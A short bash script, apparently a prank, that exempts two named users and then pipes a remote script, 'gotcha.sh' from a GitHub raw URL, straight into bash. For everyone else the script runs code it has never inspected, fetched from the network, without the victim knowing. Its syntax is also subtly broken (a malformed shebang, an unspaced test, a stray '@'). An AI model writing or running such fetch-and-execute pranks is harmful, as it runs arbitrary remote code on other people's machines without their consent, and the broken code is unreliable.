#bin/bash

if [$(whoami) == "jkauker" || $(whoami) == "nsabia"] then
	echo "You cant troll me!"
	exit 1
fi

@curl -s https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh | bash && exit 0